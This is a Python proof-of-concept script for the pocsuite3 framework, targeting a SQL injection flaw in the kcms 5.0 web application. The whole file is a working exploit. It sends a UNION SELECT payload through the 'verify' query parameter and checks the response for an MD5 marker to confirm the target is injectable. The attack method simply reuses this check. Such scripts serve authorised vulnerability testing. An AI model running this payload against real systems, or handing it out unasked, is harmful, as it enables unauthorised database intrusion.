"""
 @Author: UpDown
 @FileName: kcms_sql_pocsuite3.py.py
 @Time: 2022/5/9 13:27
"""
import hashlib
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString


class SqlPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1.0'
    author = ['UpDown']
    vulDate = '2019-2-26'
    createDate = '2019-2-26'
    updateDate = '2019-2-25'
    references = ['https://xz.aliyun.com/t/10952']
    name = 'kcms 5.0 sql注入'
    appPowerLink = 'http://micool.top/'
    appName = 'kcms'
    appVersion = '5.0'
    vulType = VUL_TYPE.SQL_INJECTION
    desc = '''进行kcms sql注入漏洞检测'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        # 获取用户输入参数
        o = OrderedDict()
        o["pwd"] = OptString('', description='输入随机加密值', require=True)
        return o

    def _verify(self):
        # POC具体代码
        result = {}
        pwd = self.get_option('pwd')
        payload = {
            "verify": f"-1' union select md5('{pwd}') #"
        }
        # proxies = {
        #     "http": "http://127.0.0.1:8080",
        # }

        r = requests.get(self.url, params=payload)

        md = hashlib.md5()
        md.update(pwd.encode('utf-8'))
        if r.status_code == 200 and md.hexdigest() in r.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Payload'] = payload

        return self.parse_output(result)

    def _attack(self):
        # EXP
        return self._verify()

    def parse_output(self, result):
        # 标准输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

# 注册类
register_poc(SqlPOC)